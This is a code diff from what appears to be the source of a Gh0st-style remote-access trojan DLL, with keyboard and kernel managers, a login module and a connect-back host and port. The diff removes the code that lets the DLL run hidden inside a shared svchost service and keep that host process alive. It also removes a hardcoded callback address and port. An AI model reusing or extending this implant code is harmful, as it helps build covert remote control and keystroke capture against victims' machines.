@@ -3,9 +3,8 @@
 #include "common/KeyboardManager.h"
 #include "common/login.h"
 #include "common/KernelManager.h"
-#include "common/install.h"
 
-extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[]);
+
 
 enum
 {
@@ -18,14 +17,11 @@ enum
 
 DWORD WINAPI main(char* lpServiceName);
 
-
+char	svcname[MAX_PATH];
 char  g_strHost[MAX_PATH];
 DWORD g_dwPort;
 DWORD g_dwServiceType;
 
-char	svcname[MAX_PATH];
-SERVICE_STATUS_HANDLE hServiceStatus;
-DWORD	g_dwCurrState;
 
 LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
 	// 发生异常，重新创建进程
@@ -43,8 +39,6 @@ DWORD WINAPI main(char* lpServiceName)
 	char	strKillEvent[50];
 	HANDLE	hInstallMutex = NULL;
 
-	strcpy(g_strHost, "192.168.128.1");
-	g_dwPort = 8888;
 
 	//////////////////////////////////////////////////////////////////////////
 	// Set Window Station
@@ -213,72 +207,3 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     return TRUE;
 }
 
-
-int TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress)
-{
-	SERVICE_STATUS srvStatus;
-	srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
-	srvStatus.dwCurrentState = g_dwCurrState = dwState;
-	srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
-	srvStatus.dwWin32ExitCode = dwExitCode;
-	srvStatus.dwServiceSpecificExitCode = 0;
-	srvStatus.dwCheckPoint = dwProgress;
-	srvStatus.dwWaitHint = 1000;
-	return SetServiceStatus(hServiceStatus, &srvStatus);
-}
-
-void __stdcall ServiceHandler(DWORD    dwControl)
-{
-	// not really necessary because the service stops quickly
-	switch (dwControl)
-	{
-	case SERVICE_CONTROL_STOP:
-		TellSCM(SERVICE_STOP_PENDING, 0, 1);
-		Sleep(10);
-		TellSCM(SERVICE_STOPPED, 0, 0);
-		break;
-	case SERVICE_CONTROL_PAUSE:
-		TellSCM(SERVICE_PAUSE_PENDING, 0, 1);
-		TellSCM(SERVICE_PAUSED, 0, 0);
-		break;
-	case SERVICE_CONTROL_CONTINUE:
-		TellSCM(SERVICE_CONTINUE_PENDING, 0, 1);
-		TellSCM(SERVICE_RUNNING, 0, 0);
-		break;
-	case SERVICE_CONTROL_INTERROGATE:
-		TellSCM(g_dwCurrState, 0, 0);
-		break;
-	}
-}
-
-
-extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[])
-{
-	strncpy(svcname, (char*)argv[0], sizeof svcname); //it's should be unicode, but if it's ansi we do it well
-	wcstombs(svcname, argv[0], sizeof svcname);
-	hServiceStatus = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)ServiceHandler);
-	if (hServiceStatus == NULL)
-	{
-		return;
-	}
-	else FreeConsole();
-
-	TellSCM(SERVICE_START_PENDING, 0, 1);
-	TellSCM(SERVICE_RUNNING, 0, 0);
-	// call Real Service function noew
-
-	g_dwServiceType = QueryServiceTypeFromRegedit(svcname);
-	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
-	do {
-		Sleep(100);//not quit until receive stop command, otherwise the service will stop
-	} while (g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);
-	WaitForSingleObject(hThread, INFINITE);
-	CloseHandle(hThread);
-
-	if (g_dwServiceType == 0x120)
-	{
-		//Shared的服务 ServiceMain 不退出，不然一些系统上svchost进程也会退出
-		while (1) Sleep(10000);
-	}
-	return;
-}
